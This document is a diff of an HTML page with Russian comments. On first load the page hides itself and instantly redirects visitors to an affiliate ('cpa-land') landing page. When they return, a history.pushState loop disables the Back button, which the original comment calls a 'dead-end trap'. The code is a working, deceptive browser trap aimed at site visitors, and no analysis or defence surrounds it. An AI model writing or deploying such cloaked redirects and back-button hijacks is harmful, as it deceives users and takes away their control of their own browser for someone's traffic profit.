@@ -4,13 +4,12 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Загрузка...</title>
-    <style>body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #222; color: #fff; text-align: center; }</style>
+    <style>
+        body { margin: 0; background-color: #222; display: none; }
+    </style>
 </head>
 <body>
-    <div id="content">
-        <h1>Hello World</h1>
-        <p>Вы на финальной странице.</p>
-    </div>
+    <h1>Hello World</h1>
 
     <script>
         const urlParams = new URLSearchParams(window.location.search);
@@ -18,17 +17,15 @@
         const isBack = urlParams.get('back') === '1';
 
         if (isBack) {
-            // Пользователь вернулся с Бокса. Показываем Главную и ставим глухую ловушку.
-            document.getElementById('content').style.display = 'block';
+            // Если пользователь вернулся (нажал Назад), показываем Hello World и держим его
+            document.body.style.display = 'block';
             history.pushState(null, null, location.href);
             window.onpopstate = function () {
                 history.pushState(null, null, location.href);
-                // Можно добавить alert("Куда собрались?")
             };
         } else {
-            // Первый заход. Скрываем экран и моментально летим на Бокс.
-            document.body.style.display = 'none';
-            window.location.href = `https://azosteam.github.io/cpa-land/box.html?geo=${geo}`;
+            // Если зашли впервые, моментально летим на Бокс
+            window.location.replace(`https://azosteam.github.io/cpa-land/box.html?geo=${geo}`);
         }
     </script>
 </body>
